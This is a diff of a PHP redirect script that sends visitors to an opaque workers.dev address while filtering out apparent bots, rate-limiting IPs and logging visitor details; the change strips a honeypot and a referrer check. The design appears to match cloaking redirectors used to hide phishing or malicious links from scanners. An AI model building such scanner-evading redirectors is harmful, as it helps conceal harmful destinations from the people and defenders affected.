@@ -1,11 +1,9 @@
 <?php
 // Configuration
 $redirectUrl = "https://707e3565.45dea72c27a70fa75e4d6281.workers.dev"; // URL to redirect to
-$allowedReferrer = "https://google.com"; // Allowed referrer domain
 $logFile = "redirect_log.txt"; // Log file to track redirects
 $rateLimitFile = "rate_limit.txt"; // File to store IP rate limits
 $rateLimit = 5; // Max requests per IP in 1 hour
-$honeypotField = "https://bbc.com"; // Honeypot field name
 
 // Advanced Bot Detection
 function isBot() {
@@ -29,11 +27,6 @@ function isBot() {
     }
 
     return false; // Not a bot
-}
-
-// Honeypot Trap
-function isHoneypotTriggered($honeypotField) {
-    return !empty($_POST[$honeypotField]); // Bots often fill hidden fields
 }
 
 // IP Rate Limiting
@@ -67,12 +60,6 @@ function isRateLimited($ip, $rateLimitFile, $rateLimit) {
     return false; // Within rate limit
 }
 
-// Referrer Validation
-function isValidReferrer($allowedReferrer) {
-    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
-    return strpos($referrer, $allowedReferrer) === 0; // Check if referrer matches
-}
-
 // Log Request
 function logRequest($logFile, $ip, $userAgent, $referrer, $status) {
     $logEntry = date('Y-m-d H:i:s') . " - IP: $ip, User Agent: $userAgent, Referrer: $referrer, Status: $status\n";
@@ -84,9 +71,9 @@ $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
 $referrer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';
 
-// Check for bots, honeypot triggers, rate limits, and valid referrer
-if (isBot() || isHoneypotTriggered($honeypotField) || isRateLimited($ip, $rateLimitFile, $rateLimit) || !isValidReferrer($allowedReferrer)) {
-    // Block bots, honeypot triggers, rate-limited IPs, and invalid referrers
+// Check for bots and rate limits
+if (isBot() || isRateLimited($ip, $rateLimitFile, $rateLimit)) {
+    // Block bots and rate-limited IPs
     logRequest($logFile, $ip, $userAgent, $referrer, "Blocked");
     header("HTTP/1.1 403 Forbidden");
     echo "Access denied.";
